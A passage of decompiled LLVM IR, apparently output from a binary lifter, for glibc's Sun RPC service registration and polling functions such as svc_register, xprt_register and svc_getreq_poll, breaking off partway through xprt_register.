  %v2_8063346 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8063346, i32* @edx, align 4
  %tmp8 = bitcast i32* %stack_var_-132 to i8*
  store i32 %v2_8063346, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8063351 = call i8* @_memset(i8* %tmp8, i32 0, i32 32)
  store i32 %arg1, i32* %stack_var_-132, align 4
  %v2_8063366 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132)
  ret i32 %v2_8063366

; uselistorder directives
  uselistorder i32* %stack_var_-132, { 0, 2, 1, 3 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8063373 = load i32, i32* @ebp, align 4
  %v0_8063374 = load i32, i32* @edi, align 4
  %v0_8063375 = load i32, i32* @esi, align 4
  %v0_8063376 = load i32, i32* @ebx, align 4
  store i32 %v0_8063376, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8063382 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063382, i32* @ecx, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_806338a = call i32 @svc_find(i32 %v0_8063376, i32 %v0_8063375, i32 %v0_8063374)
  store i32 %v3_806338a, i32* @ebx, align 4
  %v1_8063391 = icmp eq i32 %v3_806338a, 0
  br i1 %v1_8063391, label %entry.dec_label_pc_80633c9_crit_edge, label %dec_label_pc_8063395

entry.dec_label_pc_80633c9_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80633c9

dec_label_pc_8063395:                             ; preds = %entry
  %v3_8063395 = load i32, i32* %stack_var_-20, align 4
  %v1_8063399 = inttoptr i32 %v3_806338a to i32*
  %v2_8063399 = load i32, i32* %v1_8063399, align 4
  store i32 %v2_8063399, i32* @esi, align 4
  %v1_806339b = icmp eq i32 %v3_8063395, 0
  %v1_806339d = icmp eq i1 %v1_806339b, false
  br i1 %v1_806339d, label %dec_label_pc_80633ac, label %dec_label_pc_806339f

dec_label_pc_806339f:                             ; preds = %dec_label_pc_8063395
  %v0_806339f = load i32, i32* %stack_var_-16, align 4
  %v1_806339f = call i32 @__rpc_thread_variables(i32 %v0_806339f)
  %v0_80633a4 = load i32, i32* @esi, align 4
  %v2_80633a4 = add i32 %v1_806339f, 184
  %v3_80633a4 = inttoptr i32 %v2_80633a4 to i32*
  store i32 %v0_80633a4, i32* %v3_80633a4, align 4
  br label %dec_label_pc_80633ae

dec_label_pc_80633ac:                             ; preds = %dec_label_pc_8063395
  %v2_80633ac = inttoptr i32 %v3_8063395 to i32*
  store i32 %v2_8063399, i32* %v2_80633ac, align 4
  br label %dec_label_pc_80633ae

dec_label_pc_80633ae:                             ; preds = %dec_label_pc_806339f, %dec_label_pc_80633ac
  %v0_80633b1 = load i32, i32* @ebx, align 4
  %v1_80633b1 = inttoptr i32 %v0_80633b1 to i32*
  store i32 0, i32* %v1_80633b1, align 4
  %v0_80633b7 = load i32, i32* @ebx, align 4
  %v1_80633b8 = call i32 @free(i32 %v0_80633b7)
  %v0_80633bf = load i32, i32* @edi, align 4
  %v1_80633c1 = call i32 @__GI_pmap_unset(i32 %v0_80633bf)
  br label %dec_label_pc_80633c9

dec_label_pc_80633c9:                             ; preds = %entry.dec_label_pc_80633c9_crit_edge, %dec_label_pc_80633ae
  %v0_80633d0 = phi i32 [ 0, %entry.dec_label_pc_80633c9_crit_edge ], [ %v1_80633c1, %dec_label_pc_80633ae ]
  %v2_80633cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80633cc, i32* @ebx, align 4
  store i32 %v0_8063375, i32* @esi, align 4
  store i32 %v0_8063374, i32* @edi, align 4
  store i32 %v0_8063373, i32* @ebp, align 4
  ret i32 %v0_80633d0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80633c9, { 1, 0 }
  uselistorder label %dec_label_pc_80633ae, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_80633e6

dec_label_pc_80633d6:                             ; preds = %dec_label_pc_80633e6
  %v0_80633d6 = load i32, i32* @ecx, align 4
  %v1_80633d8 = add i32 %v3_80633eb, 8
  %v2_80633d8 = inttoptr i32 %v1_80633d8 to i32*
  %v3_80633d8 = load i32, i32* %v2_80633d8, align 4
  %v1_80633db = add i32 %v3_80633eb, 4
  %v2_80633db = inttoptr i32 %v1_80633db to i32*
  %v3_80633db = load i32, i32* %v2_80633db, align 4
  %v4_80633de = call i32 @svc_unregister(i32 %v3_80633db, i32 %v3_80633d8, i32 %v0_80633d6, i32 %v0_80633d6)
  br label %dec_label_pc_80633e6

dec_label_pc_80633e6:                             ; preds = %entry, %dec_label_pc_80633d6
  %v0_80633e6 = phi i32 [ %v3_80633db, %dec_label_pc_80633d6 ], [ %tmp7, %entry ]
  %v1_80633e6 = call i32 @__rpc_thread_variables(i32 %v0_80633e6)
  %v1_80633eb = add i32 %v1_80633e6, 184
  %v2_80633eb = inttoptr i32 %v1_80633eb to i32*
  %v3_80633eb = load i32, i32* %v2_80633eb, align 4
  %v1_80633f1 = icmp eq i32 %v3_80633eb, 0
  %v1_80633f3 = icmp eq i1 %v1_80633f1, false
  br i1 %v1_80633f3, label %dec_label_pc_80633d6, label %dec_label_pc_80633f5

dec_label_pc_80633f5:                             ; preds = %dec_label_pc_80633e6
  ret i32 %v3_80633eb

; uselistorder directives
  uselistorder i32 %v3_80633eb, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80633e6, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80633fa = load i32, i32* @edi, align 4
  %v0_80633fb = load i32, i32* @esi, align 4
  %v0_80633fc = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v2_8063408 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063408, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v3_8063414 = call i32 @svc_find(i32 %v0_80633fc, i32 %v0_80633fb, i32 %v0_80633fa)
  store i32 %v3_8063414, i32* %eax.global-to-local, align 4
  %v1_8063419 = icmp eq i32 %v3_8063414, 0
  br i1 %v1_8063419, label %dec_label_pc_8063424, label %dec_label_pc_806341d

dec_label_pc_806341d:                             ; preds = %entry
  %v1_806341d = add i32 %v3_8063414, 12
  %v2_806341d = inttoptr i32 %v1_806341d to i32*
  %v3_806341d = load i32, i32* %v2_806341d, align 4
  %v4_806341d = load i32, i32* @ebp, align 4
  %v15_806341d = icmp eq i32 %v3_806341d, %v4_806341d
  %v1_8063420 = icmp eq i1 %v15_806341d, false
  br i1 %v1_8063420, label %dec_label_pc_8063478, label %dec_label_pc_8063453

dec_label_pc_8063424:                             ; preds = %entry
  store i32 16, i32* %stack_var_-60, align 4
  %v1_8063429 = call i32 @malloc(i32 16)
  store i32 %v1_8063429, i32* %eax.global-to-local, align 4
  store i32 %v1_8063429, i32* @ebx, align 4
  %v1_8063433 = icmp eq i32 %v1_8063429, 0
  br i1 %v1_8063433, label %dec_label_pc_8063478, label %dec_label_pc_8063437

dec_label_pc_8063437:                             ; preds = %dec_label_pc_8063424
  %v0_8063437 = load i32, i32* @edi, align 4
  %v2_8063437 = add i32 %v1_8063429, 4
  %v3_8063437 = inttoptr i32 %v2_8063437 to i32*
  store i32 %v0_8063437, i32* %v3_8063437, align 4
  %v0_806343a = load i32, i32* @esi, align 4
  %v1_806343a = load i32, i32* %eax.global-to-local, align 4
  %v2_806343a = add i32 %v1_806343a, 8
  %v3_806343a = inttoptr i32 %v2_806343a to i32*
  store i32 %v0_806343a, i32* %v3_806343a, align 4
  %v0_806343d = load i32, i32* @ebp, align 4
  %v1_806343d = load i32, i32* %eax.global-to-local, align 4
  %v2_806343d = add i32 %v1_806343d, 12
  %v3_806343d = inttoptr i32 %v2_806343d to i32*
  store i32 %v0_806343d, i32* %v3_806343d, align 4
  %v0_8063440 = load i32, i32* %stack_var_-60, align 4
  %v1_8063440 = call i32 @__rpc_thread_variables(i32 %v0_8063440)
  store i32 %v1_8063440, i32* %eax.global-to-local, align 4
  %v1_8063445 = add i32 %v1_8063440, 184
  %v2_8063445 = inttoptr i32 %v1_8063445 to i32*
  %v3_8063445 = load i32, i32* %v2_8063445, align 4
  %v1_806344b = load i32, i32* @ebx, align 4
  %v2_806344b = inttoptr i32 %v1_806344b to i32*
  store i32 %v3_8063445, i32* %v2_806344b, align 4
  %v0_806344d = load i32, i32* @ebx, align 4
  store i32 %v0_806344d, i32* %v2_8063445, align 4
  br label %dec_label_pc_8063453

dec_label_pc_8063453:                             ; preds = %dec_label_pc_806341d, %dec_label_pc_8063437
  store i32 1, i32* %eax.global-to-local, align 4
  %v4_8063458 = icmp eq i32 %arg5, 0
  br i1 %v4_8063458, label %dec_label_pc_806347a, label %dec_label_pc_806345f

dec_label_pc_806345f:                             ; preds = %dec_label_pc_8063453
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8063463 = add i32 %arg1, 4
  %v2_8063463 = inttoptr i32 %v1_8063463 to i16*
  %v3_8063463 = load i16, i16* %v2_8063463, align 2
  %v4_8063463 = zext i16 %v3_8063463 to i32
  store i32 %v4_8063463, i32* %eax.global-to-local, align 4
  %v0_806346c = load i32, i32* @esi, align 4
  %v0_806346d = load i32, i32* @edi, align 4
  store i32 %v0_806346d, i32* %stack_var_-60, align 4
  %v4_806346e = call i32 @pmap_set(i32 %v0_806346d, i32 %v0_806346c, i32 %arg5, i32 %v4_8063463)
  store i32 %v4_806346e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806347a

dec_label_pc_8063478:                             ; preds = %dec_label_pc_8063424, %dec_label_pc_806341d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806347a

dec_label_pc_806347a:                             ; preds = %dec_label_pc_8063453, %dec_label_pc_806345f, %dec_label_pc_8063478
  %v0_8063481 = phi i32 [ 1, %dec_label_pc_8063453 ], [ %v4_806346e, %dec_label_pc_806345f ], [ 0, %dec_label_pc_8063478 ]
  ret i32 %v0_8063481

; uselistorder directives
  uselistorder i32 %v1_8063429, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @svc_find, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806347a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8063453, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8063482 = load i32, i32* @esi, align 4
  %v0_8063483 = load i32, i32* @ebx, align 4
  store i32 %v0_8063483, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_806348b = load i32, i32* %arg1, align 4
  store i32 %v2_806348b, i32* @ebx, align 4
  %v2_806348d = call i32 @_rpc_dtablesize(i32 %v0_8063483, i32 %v0_8063482)
  %v0_8063492 = load i32, i32* @ebx, align 4
  %v5_8063494 = icmp slt i32 %v0_8063492, %v2_806348d
  br i1 %v5_8063494, label %dec_label_pc_8063496, label %dec_label_pc_80634f5

dec_label_pc_8063496:                             ; preds = %entry
  %v0_8063496 = load i32, i32* %stack_var_-8, align 4
  %v1_8063496 = call i32 @__rpc_thread_variables(i32 %v0_8063496)
  %v0_806349b = load i32, i32* @ebx, align 4
  %v1_806349b = mul i32 %v0_806349b, 4
  %v1_80634a2 = add i32 %v1_8063496, 180
  %v2_80634a2 = inttoptr i32 %v1_80634a2 to i32*
  %v3_80634a2 = load i32, i32* %v2_80634a2, align 4
  %v2_80634a8 = add i32 %v3_80634a2, %v1_806349b
  %v3_80634a8 = inttoptr i32 %v2_80634a8 to i32*
  %v4_80634a8 = load i32, i32* %v3_80634a8, align 4
  %v5_80634a8 = load i32, i32* @esi, align 4
  %v16_80634a8 = icmp eq i32 %v4_80634a8, %v5_80634a8
  %v1_80634ab = icmp eq i1 %v16_80634a8, false
  br i1 %v1_80634ab, label %dec_label_pc_80634f5, label %dec_label_pc_80634ad

dec_label_pc_80634ad:                             ; preds = %dec_label_pc_8063496
  store i32 0, i32* %v3_80634a8, align 4
  %v0_80634b4 = load i32, i32* @ebx, align 4
  %v1_80634b4 = add i32 %v0_80634b4, -1023
  %v6_80634b4 = sub i32 1022, %v0_80634b4
  %v7_80634b4 = and i32 %v6_80634b4, %v0_80634b4
  %v8_80634b4 = icmp slt i32 %v7_80634b4, 0
  %v9_80634b4 = icmp eq i32 %v1_80634b4, 0
  %v10_80634b4 = icmp slt i32 %v1_80634b4, 0
  %v3_80634ba = icmp eq i1 %v10_80634b4, %v8_80634b4
  %v4_80634ba = icmp eq i1 %v9_80634b4, false
  %v5_80634ba = and i1 %v4_80634ba, %v3_80634ba
  br i1 %v5_80634ba, label %dec_label_pc_80634cf, label %dec_label_pc_80634bc

dec_label_pc_80634bc:                             ; preds = %dec_label_pc_80634ad
  %v0_80634bc = call i32 @__GI___rpc_thread_svc_fdset()
  %v0_80634c1 = load i32, i32* @ebx, align 4
  %v2_80634c3 = udiv i32 %v0_80634c1, 32
  store i32 %v2_80634c3, i32* @ecx, align 4
  %v1_80634c8 = urem i32 %v0_80634c1, 32
  %v2_80634cb = mul nuw nsw i32 %v2_80634c3, 4
  %v3_80634cb = add i32 %v2_80634cb, %v0_80634bc
  %v4_80634cb = inttoptr i32 %v3_80634cb to i32*
  %v5_80634cb = load i32, i32* %v4_80634cb, align 4
  %v8_80634cb = shl i32 1, %v1_80634c8
  %v11_80634cb = sub i32 -1, %v8_80634cb
  %v12_80634cb = and i32 %v5_80634cb, %v11_80634cb
  store i32 %v12_80634cb, i32* %v4_80634cb, align 4
  br label %dec_label_pc_80634cf

dec_label_pc_80634cf:                             ; preds = %dec_label_pc_80634ad, %dec_label_pc_80634bc
  br label %dec_label_pc_80634ec

dec_label_pc_80634d3:                             ; preds = %dec_label_pc_80634ec
  %v0_80634d3 = call i32 @__rpc_thread_svc_pollfd()
  %v0_80634d8 = load i32, i32* @esi, align 4
  %v1_80634d8 = mul i32 %v0_80634d8, 8
  %v2_80634df = inttoptr i32 %v0_80634d3 to i32*
  %v3_80634df = load i32, i32* %v2_80634df, align 4
  %v4_80634df = add i32 %v3_80634df, %v1_80634d8
  %v1_80634e1 = inttoptr i32 %v4_80634df to i32*
  %v2_80634e1 = load i32, i32* %v1_80634e1, align 4
  %v3_80634e1 = load i32, i32* @ebx, align 4
  %v14_80634e1 = icmp eq i32 %v2_80634e1, %v3_80634e1
  %v1_80634e3 = icmp eq i1 %v14_80634e1, false
  br i1 %v1_80634e3, label %dec_label_pc_80634eb, label %dec_label_pc_80634e5

dec_label_pc_80634e5:                             ; preds = %dec_label_pc_80634d3
  store i32 -1, i32* %v1_80634e1, align 4
  %v0_80634eb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80634eb

dec_label_pc_80634eb:                             ; preds = %dec_label_pc_80634d3, %dec_label_pc_80634e5
  %v0_80634eb = phi i32 [ %v0_80634d8, %dec_label_pc_80634d3 ], [ %v0_80634eb.pre, %dec_label_pc_80634e5 ]
  %v1_80634eb = add i32 %v0_80634eb, 1
  br label %dec_label_pc_80634ec

dec_label_pc_80634ec:                             ; preds = %dec_label_pc_80634cf, %dec_label_pc_80634eb
  %storemerge = phi i32 [ 0, %dec_label_pc_80634cf ], [ %v1_80634eb, %dec_label_pc_80634eb ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_80634ec = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_80634f1 = load i32, i32* @esi, align 4
  %v2_80634f1 = inttoptr i32 %v0_80634ec to i32*
  %v3_80634f1 = load i32, i32* %v2_80634f1, align 4
  %v5_80634f3 = icmp slt i32 %v0_80634f1, %v3_80634f1
  br i1 %v5_80634f3, label %dec_label_pc_80634d3, label %dec_label_pc_80634f5

dec_label_pc_80634f5:                             ; preds = %dec_label_pc_80634ec, %entry, %dec_label_pc_8063496
  %v0_80634f8 = phi i32 [ %v2_806348d, %entry ], [ %v3_80634a2, %dec_label_pc_8063496 ], [ %v0_80634ec, %dec_label_pc_80634ec ]
  %v2_80634f6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80634f6, i32* @ebx, align 4
  store i32 %v0_8063482, i32* @esi, align 4
  ret i32 %v0_80634f8

; uselistorder directives
  uselistorder i32 %v2_80634c3, { 1, 0 }
  uselistorder i32 %v0_80634c1, { 1, 0 }
  uselistorder i32 %v1_80634b4, { 1, 0 }
  uselistorder i32 %v3_80634a2, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80634f5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80634ec, { 1, 0 }
  uselistorder label %dec_label_pc_80634eb, { 1, 0 }
  uselistorder label %dec_label_pc_80634cf, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80634fc = load i32, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_806354b11 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_806355012 = load i32, i32* @esi, align 4
  %v2_806355013 = inttoptr i32 %v0_806354b11 to i32*
  %v3_806355014 = load i32, i32* %v2_806355013, align 4
  %v5_806355222 = icmp slt i32 %v0_806355012, %v3_806355014
  br i1 %v5_806355222, label %dec_label_pc_8063554, label %dec_label_pc_8063558

dec_label_pc_806350a:                             ; preds = %dec_label_pc_8063554
  %v2_806350e = mul i32 %v0_806355024, 8
  %v3_806350e = add i32 %v2_806350e, %arg1
  %v1_8063511 = inttoptr i32 %v3_806350e to i32*
  %v2_8063511 = load i32, i32* %v1_8063511, align 4
  store i32 %v2_8063511, i32* @ebx, align 4
  %v10_8063513 = icmp eq i32 %v2_8063511, -1
  br i1 %v10_8063513, label %dec_label_pc_806354a, label %dec_label_pc_8063518

dec_label_pc_8063518:                             ; preds = %dec_label_pc_806350a
  %v1_8063518 = add i32 %v3_806350e, 6
  %v2_8063518 = inttoptr i32 %v1_8063518 to i16*
  %v3_8063518 = load i16, i16* %v2_8063518, align 2
  %v4_806351c = icmp eq i16 %v3_8063518, 0
  br i1 %v4_806351c, label %dec_label_pc_806354a, label %dec_label_pc_8063521

dec_label_pc_8063521:                             ; preds = %dec_label_pc_8063518
  %v1_8063521 = add i32 %v0_8063554, 1
  store i32 %v1_8063521, i32* @edi, align 4
  %v2_8063522 = and i16 %v3_8063518, 32
  %v3_8063522 = icmp eq i16 %v2_8063522, 0
  br i1 %v3_8063522, label %dec_label_pc_806353e, label %dec_label_pc_8063526

dec_label_pc_8063526:                             ; preds = %dec_label_pc_8063521
  %v1_8063526 = call i32 @__rpc_thread_variables(i32 %v0_80634fc)
  %v1_806352e = add i32 %v1_8063526, 180
  %v2_806352e = inttoptr i32 %v1_806352e to i32*
  %v3_806352e = load i32, i32* %v2_806352e, align 4
  %v1_8063534 = load i32, i32* @ebx, align 4
  %v2_8063534 = mul i32 %v1_8063534, 4
  %v3_8063534 = add i32 %v2_8063534, %v3_806352e
  %v4_8063534 = inttoptr i32 %v3_8063534 to i32*
  %v5_8063534 = load i32, i32* %v4_8063534, align 4
  %v1_8063537 = inttoptr i32 %v5_8063534 to i32*
  %v2_8063537 = call i32 @xprt_unregister(i32* %v1_8063537)
  br label %dec_label_pc_8063547

dec_label_pc_806353e:                             ; preds = %dec_label_pc_8063521
  %v1_8063542 = call i32 @svc_getreq_common(i32 %v2_8063511)
  br label %dec_label_pc_8063547

dec_label_pc_8063547:                             ; preds = %dec_label_pc_8063526, %dec_label_pc_806353e
  %v0_806354a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806354a

dec_label_pc_806354a:                             ; preds = %dec_label_pc_8063518, %dec_label_pc_806350a, %dec_label_pc_8063547
  %v0_806354a = phi i32 [ %v0_806355024, %dec_label_pc_8063518 ], [ %v0_806355024, %dec_label_pc_806350a ], [ %v0_806354a.pre, %dec_label_pc_8063547 ]
  %v1_806354a = add i32 %v0_806354a, 1
  store i32 %v1_806354a, i32* @esi, align 4
  %v0_806354b = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8063550 = load i32, i32* @esi, align 4
  %v2_8063550 = inttoptr i32 %v0_806354b to i32*
  %v3_8063550 = load i32, i32* %v2_8063550, align 4
  %v5_8063552 = icmp slt i32 %v0_8063550, %v3_8063550
  br i1 %v5_8063552, label %dec_label_pc_8063554, label %dec_label_pc_8063558

dec_label_pc_8063554:                             ; preds = %entry, %dec_label_pc_806354a
  %v0_806355024 = phi i32 [ %v0_8063550, %dec_label_pc_806354a ], [ %v0_806355012, %entry ]
  %v0_806354b23 = phi i32 [ %v0_806354b, %dec_label_pc_806354a ], [ %v0_806354b11, %entry ]
  %v0_8063554 = load i32, i32* @edi, align 4
  %v1_8063554 = load i32, i32* @ebp, align 4
  %v5_8063556 = icmp slt i32 %v0_8063554, %v1_8063554
  br i1 %v5_8063556, label %dec_label_pc_806350a, label %dec_label_pc_8063558

dec_label_pc_8063558:                             ; preds = %dec_label_pc_8063554, %dec_label_pc_806354a, %entry
  %v0_806354b.lcssa = phi i32 [ %v0_806354b11, %entry ], [ %v0_806354b, %dec_label_pc_806354a ], [ %v0_806354b23, %dec_label_pc_8063554 ]
  ret i32 %v0_806354b.lcssa

; uselistorder directives
  uselistorder i32 %v0_8063554, { 1, 0 }
  uselistorder i32 %v2_8063511, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder i16 32, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063554, { 1, 0 }
  uselistorder label %dec_label_pc_806354a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063547, { 1, 0 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-24 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-24, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063561 = load i32, i32* @esi, align 4
  %v0_8063562 = load i32, i32* @ebx, align 4
  store i32 %v0_8063562, i32* %stack_var_-12, align 4
  %v1_8063563 = call i32 @__rpc_thread_variables(i32 %v0_8063562)
  store i32 %v1_8063563, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_8063563, i32* @ebx, align 4
  %v1_806356e = add i32 %v1_8063563, 180
  %v2_806356e = inttoptr i32 %v1_806356e to i32*
  %v3_806356e = load i32, i32* %v2_806356e, align 4
  %v4_806356e = icmp eq i32 %v3_806356e, 0
  %v2_8063575 = load i32, i32* %arg1, align 4
  store i32 %v2_8063575, i32* @edi, align 4
  %v1_8063577 = icmp eq i1 %v4_806356e, false
  br i1 %v1_8063577, label %dec_label_pc_806359b, label %dec_label_pc_8063579

dec_label_pc_8063579:                             ; preds = %entry
  %v0_8063579 = load i32, i32* %stack_var_-12, align 4
  %v2_8063579 = call i32 @_rpc_dtablesize(i32 %v0_8063579, i32 %v0_8063561)
  %v2_8063581 = mul i32 %v2_8063579, 4
  store i32 %v2_8063581, i32* %eax.global-to-local, align 4
  store i32 %v2_8063581, i32* %stack_var_-28, align 4
  %v1_8063585 = call i32 @malloc(i32 %v2_8063581)
  store i32 %v1_8063585, i32* %eax.global-to-local, align 4
  %v1_806358d = load i32, i32* @ebx, align 4
  %v2_806358d = add i32 %v1_806358d, 180
  %v3_806358d = inttoptr i32 %v2_806358d to i32*
  store i32 %v1_8063585, i32* %v3_806358d, align 4
  %v0_8063593 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063593 = icmp eq i32 %v0_8063593, 0
  br i1 %v1_8063593, label %dec_label_pc_8063635, label %dec_label_pc_8063579.dec_label_pc_806359b_crit_edge

dec_label_pc_8063579.dec_label_pc_806359b_crit_edge: ; preds = %dec_label_pc_8063579
  %v0_806359b.pre = load i32, i32* %stack_var_-28, align 4
  %v1_806359b.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_806359b

dec_label_pc_806359b:                             ; preds = %dec_label_pc_8063579.dec_label_pc_806359b_crit_edge, %entry
  %v1_806359b = phi i32 [ %v1_806359b.pre, %dec_label_pc_8063579.dec_label_pc_806359b_crit_edge ], [ %tmp9, %entry ]
  %v0_806359b = phi i32 [ %v0_806359b.pre, %dec_label_pc_8063579.dec_label_pc_806359b_crit_edge ], [ %tmp8, %entry ]
  %v2_806359b = call i32 @_rpc_dtablesize(i32 %v0_806359b, i32 %v1_806359b)
  store i32 %v2_806359b, i32* %eax.global-to-local, align 4
  %v0_80635a0 = load i32, i32* @edi, align 4
  %v5_80635a2 = icmp slt i32 %v0_80635a0, %v2_806359b
  br i1 %v5_80635a2, label %dec_label_pc_80635a8, label %dec_label_pc_8063635

dec_label_pc_80635a8:                             ; preds = %dec_label_pc_806359b
  %v0_80635a8 = load i32, i32* @ebx, align 4
  %v1_80635a8 = add i32 %v0_80635a8, 180
  %v2_80635a8 = inttoptr i32 %v1_80635a8 to i32*
  %v3_80635a8 = load i32, i32* %v2_80635a8, align 4
  store i32 %v3_80635a8, i32* %eax.global-to-local, align 4
  %v1_80635ae = add i32 %v0_80635a0, -1023
  %v6_80635ae = sub i32 1022, %v0_80635a0
  %v7_80635ae = and i32 %v6_80635ae, %v0_80635a0
  %v8_80635ae = icmp slt i32 %v7_80635ae, 0
  %v9_80635ae = icmp eq i32 %v1_80635ae, 0
  %v10_80635ae = icmp slt i32 %v1_80635ae, 0
  %v0_80635b4 = load i32, i32* @esi, align 4
  %v3_80635b4 = mul i32 %v0_80635a0, 4
  %v4_80635b4 = add i32 %v3_80635a8, %v3_80635b4
  %v5_80635b4 = inttoptr i32 %v4_80635b4 to i32*
  store i32 %v0_80635b4, i32* %v5_80635b4, align 4
  %v3_80635b7 = icmp eq i1 %v10_80635ae, %v8_80635ae
  %v4_80635b7 = icmp eq i1 %v9_80635ae, false
  %v5_80635b7 = and i1 %v4_80635b7, %v3_80635b7
  br i1 %v5_80635b7, label %dec_label_pc_80635cc, label %dec_label_pc_80635b9

dec_label_pc_80635b9:                             ; preds = %dec_label_pc_80635a8
  %v0_80635b9 = call i32 @__GI___rpc_thread_svc_fdset()
  store i32 %v0_80635b9, i32* %eax.global-to-local, align 4
  %v0_80635be = load i32, i32* @edi, align 4
  %v2_80635c0 = udiv i32 %v0_80635be, 32
  store i32 %v2_80635c0, i32* @ecx, align 4
  %v1_80635c5 = urem i32 %v0_80635be, 32
  %v2_80635c8 = mul nuw nsw i32 %v2_80635c0, 4
  %v3_80635c8 = add i32 %v2_80635c8, %v0_80635b9
  %v4_80635c8 = inttoptr i32 %v3_80635c8 to i32*
  %v5_80635c8 = load i32, i32* %v4_80635c8, align 4
  %v8_80635c8 = shl i32 1, %v1_80635c5
  %v11_80635c8 = or i32 %v5_80635c8, %v8_80635c8
  store i32 %v11_80635c8, i32* %v4_80635c8, align 4
  br label %dec_label_pc_80635cc

dec_label_pc_80635cc:                             ; preds = %dec_label_pc_80635a8, %dec_label_pc_80635b9
  br label %dec_label_pc_80635f3

dec_label_pc_80635d0:                             ; preds = %dec_label_pc_80635f3
  %v0_80635d0 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_80635d0, i32* %eax.global-to-local, align 4
  %v0_80635d5 = load i32, i32* @ebx, align 4
  %v1_80635d5 = mul i32 %v0_80635d5, 8
  store i32 %v1_80635d5, i32* @ecx, align 4
  %v2_80635de = inttoptr i32 %v0_80635d0 to i32*
  %v3_80635de = load i32, i32* %v2_80635de, align 4
  %v4_80635de = add i32 %v3_80635de, %v1_80635d5
  %v1_80635e0 = inttoptr i32 %v4_80635de to i32*
  %v2_80635e0 = load i32, i32* %v1_80635e0, align 4
  %v12_80635e0 = icmp eq i32 %v2_80635e0, -1
  %v1_80635e3 = icmp eq i1 %v12_80635e0, false
  br i1 %v1_80635e3, label %dec_label_pc_80635f2, label %dec_label_pc_80635e5

dec_label_pc_80635e5:                             ; preds = %dec_label_pc_80635d0
  %v0_80635e5 = load i32, i32* @edi, align 4
  store i32 %v0_80635e5, i32* %v1_80635e0, align 4
  %v2_80635e7 = load i32, i32* %v2_80635de, align 4
  store i32 %v2_80635e7, i32* %eax.global-to-local, align 4
  %v1_80635e9 = load i32, i32* @ecx, align 4
  %v2_80635e9 = add i32 %v2_80635e7, 4
  %v3_80635e9 = add i32 %v2_80635e9, %v1_80635e9
  %v4_80635e9 = inttoptr i32 %v3_80635e9 to i16*
  store i16 195, i16* %v4_80635e9, align 2
